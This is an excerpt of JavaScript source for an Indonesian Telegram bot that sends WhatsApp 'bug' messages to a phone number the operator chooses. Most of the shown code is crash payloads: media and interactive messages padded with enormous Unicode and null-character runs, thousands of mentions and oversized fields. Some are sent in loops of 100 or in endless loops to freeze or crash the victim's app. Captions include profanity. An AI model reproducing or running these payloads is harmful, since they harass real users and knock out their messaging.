...
const thumbnailUrl = "https://gangalink.vercel.app/i/hhgb4leq.jpg";
...
const GITHUB_REPO = "xwarkeren/xwar";
      ...
      if (chatMember.status === "left" || chatMember.status === "kicked") {
        ...
        return ctx.reply(
          `⛔ AKSES DITOLAK\n\nHalo ${ctx.from.first_name}, kamu wajib bergabung ke channel kami terlebih dahulu untuk menggunakan bot ini.\n\nSilakan join melalui tombol di bawah, lalu ketik /start kembali.`,
          {
            ...
            reply_markup: {
              inline_keyboard: [
                [{ text: "ᴊᴏɪɴ ᴄʜᴀɴɴᴇʟ", url: autoLink, style: "danger" }]
              ]
            }
          }
        );
...
\`\`\``;
  ...
  await ctx.replyWithPhoto(thumbnailUrl, {
    ...
    reply_markup: {
      inline_keyboard: [
        [
          { text: "◀", callback_data: "/tqto", style: "primary", icon_custom_emoji_id: "5438628696497859833" },
          { text: "ʜᴏᴍᴇ", callback_data: "/start", style: "success", icon_custom_emoji_id: "5267490824031061544" },
          { text: "▶", callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5438628696497859833" }
        ],
        [
          { text: "sʏsᴛᴇᴍ", callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5438628696497859833" },
          { text: "ᴍᴇɴᴜ", callback_data: "/scmd_menu", style: "success", icon_custom_emoji_id: "5267490824031061544" },
          { text: "ʙᴜɢ", callback_data: "/bug", style: "danger", icon_custom_emoji_id: "5438628696497859833" }
        ],
        [
          { text: "ᴏᴡɴᴇʀ", url: "https://t.me/Xwarrxxx", style: "danger", icon_custom_emoji_id: "5267490824031061544" }
        ]
      ],
    },
  });
...
\`\`\``;
    ...
    const keyboard = [
        [
          { text: "◀", callback_data: "/start", style: "primary", icon_custom_emoji_id: "5438628696497859833" },
          { text: "ʜᴏᴍᴇ", callback_data: "/start", style: "success", icon_custom_emoji_id: "5267490824031061544" },
          { text: "▶", callback_data: "/scmd_menu", style: "primary", icon_custom_emoji_id: "5438628696497859833" }
        ],
        [
          { text: "sʏsᴛᴇᴍ", callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5438628696497859833" },
          { text: "ᴍᴇɴᴜ", callback_data: "/scmd_menu", style: "success", icon_custom_emoji_id: "5267490824031061544" },
...
\`\`\``;
    ...
    const keyboard = [
        [
          { text: "◀", callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5438628696497859833" },
          { text: "ʜᴏᴍᴇ", callback_data: "/start", style: "success", icon_custom_emoji_id: "5267490824031061544" },
          { text: "▶", callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5438628696497859833" }
        ],
        [
          { text: "sʏsᴛᴇᴍ", callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5438628696497859833" },
          { text: "ᴍᴇɴᴜ", callback_data: "/scmd_menu", style: "success", icon_custom_emoji_id: "5267490824031061544" },
...
\`\`\``;
  ...
  const keyboard = [
    [
      { text: "ɪɴᴠɪsɪʙʟᴇ ʙᴜɢ", callback_data: "/bug_delay", style: "success", icon_custom_emoji_id: "5438628696497859833" },
      { text: "ᴠɪsɪʙʟᴇ ʙᴜɢ", callback_data: "/bug_visible", style: "danger", icon_custom_emoji_id: "5267490824031061544" }
    ],
    [
      { text: "◀", callback_data: "/scmd_menu", style: "primary", icon_custom_emoji_id: "5438628696497859833" },
      { text: "ʜᴏᴍᴇ", callback_data: "/start", style: "success", icon_custom_emoji_id: "5267490824031061544" },
      { text: "▶", callback_data: "/bug_delay", style: "primary", icon_custom_emoji_id: "5438628696497859833" }
    ],
    [
      { text: "sʏsᴛᴇᴍ", callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5438628696497859833" },
      { text: "ᴍᴇɴᴜ", callback_data: "/scmd_menu", style: "success", icon_custom_emoji_id: "5267490824031061544" },
...
\`\`\``;
  ...
  const keyboard = [
    [
      { text: "◀", callback_data: "/bug", style: "primary", icon_custom_emoji_id: "5438628696497859833" },
      { text: "ʜᴏᴍᴇ", callback_data: "/start", style: "success", icon_custom_emoji_id: "5267490824031061544" },
      { text: "▶", callback_data: "/bug_visible", style: "primary", icon_custom_emoji_id: "5438628696497859833" }
    ],
    [
      { text: "sʏsᴛᴇᴍ", callback_data: "/controls", style: "primary", icon_custom_emoji_id: "5438628696497859833" },
      { text: "ᴍᴇɴᴜ", callback_data: "/scmd_menu", style: "success", icon_custom_emoji_id: "5267490824031061544" },
...
if (!isOwner) {
    try {
      ...
      return ctx.reply("⚠️ *MAAF!* Command ini sedang dinonaktifkan oleh Owner untuk sementara waktu.", { parse_mode: "Markdown" });
    }

if (ctx.from.id == ownerID) {
} else {
    if (ctx.chat.type === "private") {
        return ctx.reply("*❌ Bot hanya bisa digunakan di grup yang memiliki akses.*", { parse_mode: "Markdown" });
    }

    const allowed = loadAllowedGroups();
    if (!allowed.includes(ctx.chat.id)) {
        return ctx.reply("*❌ Grup ini tidak memiliki akses.*", { parse_mode: "Markdown" });
    }
}
if (!tokenValidated) {
        return;
  ...
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("*Format:* `/quantumdelay 62xxxx`", { parse_mode: "Markdown" });
  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
  let mention = true;
...
📛 *Nama Grup:* ${groupName}`,
  ...
  await ctx.reply(`✅ Sukses kirim bug ke target ${q}`, { parse_mode: "Markdown" });
...
async function glorySDelay(sock, target) {
...
async function DelayXdozer(sock, target) {
  const xvzz1 = generateWAMessageFromContent(
    target,
    {
      ephemeralMessage: {
        message: {
  ...
  const xvzz2 = generateWAMessageFromContent(
    target,
    {
  ...
  await sock.relayMessage(
    target,
    { groupStatusMessageV2: { message: xvzz1.message } },
    {
      messageId: xvzz1.key.id,
      participant: { jid: target },
    }
  );
  ...
  await sock.relayMessage(
    target,
    { groupStatusMessageV2: { message: xvzz2.message } },
    {
      messageId: xvzz2.key.id,
      participant: { jid: target },
    }
  );
}

async function Scpolsz(target) {
  while (true) {
...
async function XxEfci(sock, target) {
  while (true) {
        ...
        groupStatusMessageV2: {
          message: {
            ephemeralMessage: {
              message: {
                imageMessage: {
                  url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQM7WWsz9Uno9M95rD-wCTfHG1zqa2ketFXzf9kYO_Mlvo3gEEhhBkWgwgW_iywVhkuyBk0O9D41LH7dkMTFCBZ0tEH8eOxbhEYMDevlnw?ccb=9-4&oh=01_Q5Aa4QG-9yXF5xeQM81wVnbr4b2F-ZtSEl-CgOsUR8TRy87fJQ&oe=69FC2106&_nc_sid=e6ed6c&mms3=true",
                  mediaKey: Buffer.from("3Gwt6MMPTn8TKN4ooMnkShG6W0CzGWXZOuAtpYMr5Gc=", "base64"),
                  fileEncSha256: Buffer.from("PilBnKndGO+TImrkKUHiNMCkdlmKVf46zMw5k3z+H2E=", "base64"),
                  fileSha256: Buffer.from("+hEm0oYyuRpwshMCw7Ql9AESR+pp/bnWOJBqRO3aJ74=", "base64"),
                  fileLength: 142915,
                  directPath: "/o1/v/t24/f2/m235/AQM7WWsz9Uno9M95rD-wCTfHG1zqa2ketFXzf9kYO_Mlvo3gEEhhBkWgwgW_iywVhkuyBk0O9D41LH7dkMTFCBZ0tEH8eOxbhEYMDevlnw?ccb=9-4&oh=01_Q5Aa4QG-9yXF5xeQM81wVnbr4b2F-ZtSEl-CgOsUR8TRy87fJQ&oe=69FC2106&_nc_sid=e6ed6c",
                  mimetype: "image/jpeg",
                  width: 1280,
                  height: 853,
                  fileName: "APONG",
...
async function Statusdelay(sock, target) {
  for (let i = 0; i < 100; i++) {
    try {   
      const msg1 = {
        groupStatusMessageV2: {
      ...
      const msg2 = {
        stickerMessage: {
          url: "https://mmg.whatsapp.net/o1/v/t62.7118-24/f2/m231/AQPldM8QgftuVmzgwKt77-USZehQJ8_zFGeVTWru4oWl6SGKMCS5uJb3vejKB-KHIapQUxHX9KnejBum47pJSyB-htweyQdZ1sJYGwEkJw?ccb=9-4&oh=01_Q5AaIRPQbEyGwVipmmuwl-69gr_iCDx0MudmsmZLxfG-ouRi&oe=681835F6&_nc_sid=e6ed6c",
      ...
      console.log(`SUCCES SENDING BUG DELAY ${target} - Loop ${i + 1}`);
...
async function siksaksok(sock, target) {
  for (let cycle = 0; cycle < 100; cycle++) {
    let phantomMsg = generateWAMessageFromContent(target, {
      interactiveResponseMessage: {
        contextInfo: {
          mentionedJid: Array.from({ length: 2000 }, (_, idx) => `6285983729${idx + 1}@s.whatsapp.net`)
        },
        body: {
          text: "",
          format: "DEFAULT"
    ...
    await sock.relayMessage(
      ...
      {
        groupStatusMessageV2: {
          message: phantomMsg.message
        }
      },
      {
        messageId: phantomMsg.key.id,
        statusJidList: [target],
        additionalNodes: [
          {
            tag: "meta",
  ...
  const msgAudio = await generateWAMessageFromContent(target, SonicWave.message, { userJid: target });
  ...
  const lethalVideo = {
    videoMessage: {
      ...
      mimetype: "video/mp4",
      caption: "KONTOL LU" + "ꦽ".repeat(99999) + "ꦾꦾ".repeat(9900) + "\u0000".repeat(5000),
      ...
      newsletterFollowerInviteMessage: {
        ...
        caption: "PEMERINTAH KONTOL" + "\u0000".repeat(5000),
      }
    }
  };

  const msgVideo = await generateWAMessageFromContent(target, lethalVideo, { userJid: target });
  ...
  console.log(chalk.red(`Success Sending To Status - ${target}`));
}

async function clockfreeze(sock, target) {
  const lethalPayload = {
    videoMessage: {
      url: "https://mmg.whatsapp.net/v/t62.7161-24/76bf210db2e5ddde3aecab4260d154209145f976.enc?ccb=11-4&oh=01_FakeHash&oe=69CACDB6&_nc_sid=5e03e0&mms3=true",
      directPath: "product-media/b8772fd0a1d1d62c",
      mimetype: "video/mp4",
      caption: "DESAH" + "ꦽ".repeat(99999) + "ꦾꦾ".repeat(9900) + "\u0000".repeat(5000),
      mediaKey: "xWD083UnPcnqnBtnLbpqQHCFI5u35p5AzGFLHzGR7CM=",
      fileEncSha256: "bbfSmz2AGsh1wLcTEWbJYJyz1ev4fFVhilYY8xJDQLI=",
      fileSha256: "bbfSmz2AGsh1wLcTEWbJYJyz1ev4fFVhilYY8xJDQLI=",
      fileLength: "3838597",
  ...
  await sock.relayMessage(target, lethalPayload, { messageId: null });
    ...
    botInvokeMessage: {
      message: {
        newsletterAdminInviteMessage: {
          ...
          newsletterName: "Hallo qhaqha" + "ી".repeat(120000),
          jpegThumbnail: "",
      ...
      buttons: [
        ...
        },
        {
          ...
          paramsJson: {
            ...
            screen_1_Dropdown_0: "what",
            screen_1_DatePicker_1: "1028995200000",
            screen_1_TextInput_2: "war@gmail.com",
            screen_1_TextInput_3: "94643116",
            screen_0_TextInput_0: "\u0000".repeat(500000),
            screen_0_TextInput_1: "Kill",
            screen_0_Dropdown_2: "Kill",
      ...
      groupMentions: [
        {
          ...
          groupSubject: "#No 1 Ampas",
        },
      ],
    },
  };

  await sock.relayMessage(target, extendedPayload, {
    userJid: target,
    participant: { jid: target },
  });
...
async function sqLProvs(sock, target) {
  ...
  console.log(" SUCCES SENDING DELAY HARD");
}
